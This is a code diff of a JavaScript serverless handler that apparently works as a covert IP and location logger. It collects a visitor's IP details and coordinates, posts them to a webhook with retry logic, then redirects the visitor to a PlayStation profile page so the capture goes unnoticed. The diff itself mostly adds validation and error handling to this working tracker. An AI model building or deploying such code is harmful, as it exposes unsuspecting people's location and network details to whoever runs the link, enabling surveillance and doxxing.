@@ -8,9 +8,14 @@ async function sendToWebhook(message) {
     try {
         console.log("Attempting to send webhook message:", JSON.stringify(message, null, 2));
 
+        // Validate embeds
+        if (!message.embeds || !Array.isArray(message.embeds)) {
+            throw new Error("Invalid embeds format: Expected an array.");
+        }
+
         const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(message),
         });
 
@@ -23,9 +28,11 @@ async function sendToWebhook(message) {
             console.error(`Webhook Error [${response.status}]: ${responseText}`);
             if (response.status === 429) {
                 console.warn("Rate limit exceeded. Retrying...");
-                const retryAfter = parseInt(response.headers.get('retry-after') || '1', 10) * 1000;
+                const retryAfter = parseInt(response.headers.get("retry-after") || "1", 10) * 1000;
                 await new Promise((resolve) => setTimeout(resolve, retryAfter));
                 await sendToWebhook(message); // Retry
+            } else {
+                throw new Error(`Failed to send webhook: ${responseText}`);
             }
         } else {
             console.log("Webhook message sent successfully.");
@@ -318,7 +325,6 @@ export default async function handler(req, res) {
             console.log("Preparing to send the default message with full info...");
 
             try {
-
                 const fields = createCommonFields(
                     ipDetails,
                     coords,
@@ -352,15 +358,13 @@ export default async function handler(req, res) {
                 await sendToWebhook(message);
 
                 console.log("Default webhook message sent successfully.");
-
             } catch (error) {
                 console.error("An error occurred while sending the default webhook message:", error);
             }
         }
 
-
         console.log("Redirecting user to https://profile.playstation.com/LB7...");
-        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+        res.writeHead(302, { Location: "https://profile.playstation.com/LB7" });
         res.end();
 
     } else {
